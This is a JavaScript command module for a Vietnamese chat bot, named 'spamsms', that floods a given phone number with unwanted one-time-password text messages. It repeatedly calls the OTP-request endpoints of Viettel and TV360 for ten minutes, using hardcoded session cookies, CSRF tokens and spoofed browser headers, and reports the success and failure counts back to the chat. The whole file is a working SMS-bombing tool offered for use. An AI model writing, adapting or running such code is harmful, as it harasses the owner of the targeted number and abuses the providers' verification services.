const axios = require('axios');

module.exports = {
  name: "spamsms",
  usedby: 0,
  info: "gửi thông báo đến số",
  onPrefix: false,
  cooldowns: 10,

  onLaunch: function ({ api, event }) {
    const args = event.body.trim().split(" ");
    if (args.length < 2) {
      return api.sendMessage("Vui lòng nhập số điện thoại. Ví dụ: spamsms 0123456789", event.threadID, event.messageID);
    }

    const phone = args[1];
    const spamDuration = 10 * 60 * 1000; // 10 minutes in milliseconds
    const viettelCookies = {
      'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
      '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
      'redirectLogin': 'https://viettel.vn/dang-ky',
      'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    };

    const viettelHeaders = {
      'Connection': 'keep-alive',
      'Content-Type': 'application/json;charset=UTF-8',
      'Origin': 'https://viettel.vn',
      'Referer': 'https://viettel.vn/dang-ky',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
      'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
      'X-Requested-With': 'XMLHttpRequest',
      'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
      'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
    };

    const viettelData = {
      msisdn: phone,
    };

    const tv360Headers = {
      "Host": "m.tv360.vn",
      "Connection": "keep-alive",
      "Content-Length": "23",
      "Accept": "application/json, text/plain, */*",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36",
      "Content-Type": "application/json",
      "Origin": "http://m.tv360.vn",
      "Referer": "http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
      "Accept-Encoding": "gzip, deflate"
    };

    const tv360Data = {
      msisdn: phone
    };

    // Initial message to be edited later
    let messageID = null;
    let successCount = 0;
    let failureCount = 0;

    // Send initial message showing spam details
    const initialMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
    api.sendMessage(initialMessage, event.threadID, (error, messageInfo) => {
      if (!error) {
        messageID = messageInfo.messageID;
      }
    });

    // Function to send spam requests
    const sendSpamRequests = () => {
      // Send both requests in parallel
      Promise.all([
        axios.post('https://viettel.vn/api/get-otp', viettelData, {
          headers: viettelHeaders,
          withCredentials: true,
          cookies: viettelCookies,
        }),
        axios.post("http://m.tv360.vn/public/v1/auth/get-otp-login", tv360Data, {
          headers: tv360Headers
        })
      ])
      .then(() => {
        successCount += 2;
        updateMessage();
      })
      .catch(() => {
        failureCount += 2;
        updateMessage();
      });
    };

    // Function to update the message with success and failure count
    const updateMessage = () => {
      const updatedMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
      if (messageID) {
        api.editMessage(updatedMessage, event.threadID, messageID);
      }
    };

    // Send the spam requests every 120 seconds (120000 milliseconds)
    const interval = setInterval(sendSpamRequests, 120000);

    // Send the first spam request immediately
    sendSpamRequests();

    // Stop spamming after the specified duration
    setTimeout(() => {
      clearInterval(interval);
      api.sendMessage(`Đã dừng spam SMS cho số ${phone}. Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`, event.threadID, event.messageID);
    }, spamDuration);
  }
};
